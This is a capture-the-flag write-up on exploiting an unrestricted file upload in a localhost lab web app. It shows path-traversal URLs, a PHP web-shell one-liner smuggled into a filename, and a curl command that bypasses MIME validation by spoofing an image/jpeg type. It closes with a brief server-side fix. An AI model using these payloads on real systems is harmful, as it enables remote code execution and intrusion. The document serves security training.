## [Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)

This vulnerability is on the File Upload page: http://localhost:8080/index.php?page=upload.

By tring to upload several files, we can see that we can seemingly only send `.jpg` or `.jpeg` files:

- `test.jpeg` → `/tmp/test.jpeg succesfully uploaded.`
- `test.png` → `Your image was not uploaded.`
- `test.php` → `Your image was not uploaded.`

Local file inclusion doesn't work here: http://localhost:8080/?page=../../../../../../../tmp and
http://localhost:8080/?page=../../../../../../../tmp/test.jpeg only say `You can DO it !!!  :]`.

We tried to execute code during the filename validation with a file called `'<?php system($_GET[cmd]); ?>.jpeg'`, however it only resutls in `/tmp/.jpeg succesfully uploaded.`.

With `curl`, by copying the request sent from a browser and hardcoding the type to be a JPEG, we get the flag:

```console
$ curl -X POST 'http://localhost:8080/index.php?page=upload#' \
    -H 'Content-Type: multipart/form-data' \
    -F 'uploaded=@server_side_validation/resources/test.php;type=image/jpeg' \
    -F 'MAX_FILE_SIZE=100000' \
    -F 'Upload=Upload'
[...]
<h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2>
[...]
```

The vulnerability can be fixed with stronger server-side validation, checking that the file corresponds to the MIME type.
